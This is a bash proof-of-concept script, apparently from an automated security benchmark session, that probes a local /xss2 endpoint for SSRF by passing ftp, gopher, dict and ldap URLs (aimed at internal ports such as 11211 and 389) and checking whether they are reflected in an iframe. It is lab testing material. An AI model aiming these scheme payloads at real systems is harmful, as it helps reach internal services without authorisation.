#!/bin/bash
# POC: Demonstrates SSRF via alternative protocols (FTP/Gopher) in /xss2 endpoint - shows that non-http/https protocols are not filtered
# Target: ./repo
# Created: 2025-11-05T17:29:23.815Z
# Session: benchmark-XBEN-047-24-mhm9f6sp

# SSRF via Alternative Protocols (FTP/Gopher) POC
# Demonstrates that the /xss2 endpoint filter does not block FTP, Gopher, and other protocols
# Target: http://localhost:5000/xss2

TARGET="http://localhost:5000"
ENDPOINT="/xss2"

echo "=========================================="
echo "SSRF via Alternative Protocols POC"
echo "=========================================="
echo ""

# Test 1: FTP Protocol
echo "[*] Test 1: FTP Protocol SSRF"
echo "Testing: ${TARGET}${ENDPOINT}?url=ftp://localhost/"
RESPONSE=$(curl -s "${TARGET}${ENDPOINT}?url=ftp://localhost/")
echo "Response:"
echo "$RESPONSE"
echo ""

# Check if FTP URL is reflected in iframe
if echo "$RESPONSE" | grep -q 'ftp://localhost'; then
    echo "[+] VULNERABLE: FTP protocol URL reflected in iframe src"
    FTP_VULN=1
else
    echo "[-] FTP URL not found in response"
    FTP_VULN=0
fi
echo ""

# Test 2: Gopher Protocol
echo "[*] Test 2: Gopher Protocol SSRF"
echo "Testing: ${TARGET}${ENDPOINT}?url=gopher://localhost:70/"
RESPONSE=$(curl -s "${TARGET}${ENDPOINT}?url=gopher://localhost:70/")
echo "Response:"
echo "$RESPONSE"
echo ""

# Check if Gopher URL is reflected in iframe
if echo "$RESPONSE" | grep -q 'gopher://localhost'; then
    echo "[+] VULNERABLE: Gopher protocol URL reflected in iframe src"
    GOPHER_VULN=1
else
    echo "[-] Gopher URL not found in response"
    GOPHER_VULN=0
fi
echo ""

# Test 3: Dict Protocol (additional SSRF vector)
echo "[*] Test 3: Dict Protocol SSRF"
echo "Testing: ${TARGET}${ENDPOINT}?url=dict://localhost:11211/"
RESPONSE=$(curl -s "${TARGET}${ENDPOINT}?url=dict://localhost:11211/")
echo "Response:"
echo "$RESPONSE"
echo ""

# Check if Dict URL is reflected in iframe
if echo "$RESPONSE" | grep -q 'dict://localhost'; then
    echo "[+] VULNERABLE: Dict protocol URL reflected in iframe src"
    DICT_VULN=1
else
    echo "[-] Dict URL not found in response"
    DICT_VULN=0
fi
echo ""

# Test 4: LDAP Protocol
echo "[*] Test 4: LDAP Protocol SSRF"
echo "Testing: ${TARGET}${ENDPOINT}?url=ldap://localhost:389/"
RESPONSE=$(curl -s "${TARGET}${ENDPOINT}?url=ldap://localhost:389/")
echo "Response:"
echo "$RESPONSE"
echo ""

# Check if LDAP URL is reflected in iframe
if echo "$RESPONSE" | grep -q 'ldap://localhost'; then
    echo "[+] VULNERABLE: LDAP protocol URL reflected in iframe src"
    LDAP_VULN=1
else
    echo "[-] LDAP URL not found in response"
    LDAP_VULN=0
fi
echo ""

# Summary
echo "=========================================="
echo "VULNERABILITY SUMMARY"
echo "=========================================="
echo "FTP Protocol:    $([ $FTP_VULN -eq 1 ] && echo 'VULNERABLE' || echo 'BLOCKED')"
echo "Gopher Protocol: $([ $GOPHER_VULN -eq 1 ] && echo 'VULNERABLE' || echo 'BLOCKED')"
echo "Dict Protocol:   $([ $DICT_VULN -eq 1 ] && echo 'VULNERABLE' || echo 'BLOCKED')"
echo "LDAP Protocol:   $([ $LDAP_VULN -eq 1 ] && echo 'VULNERABLE' || echo 'BLOCKED')"
echo ""

if [ $FTP_VULN -eq 1 ] || [ $GOPHER_VULN -eq 1 ] || [ $DICT_VULN -eq 1 ] || [ $LDAP_VULN -eq 1 ]; then
    echo "[+] OVERALL: SSRF via Alternative Protocols CONFIRMED"
    exit 0
else
    echo "[-] OVERALL: No alternative protocol SSRF detected"
    exit 1
fi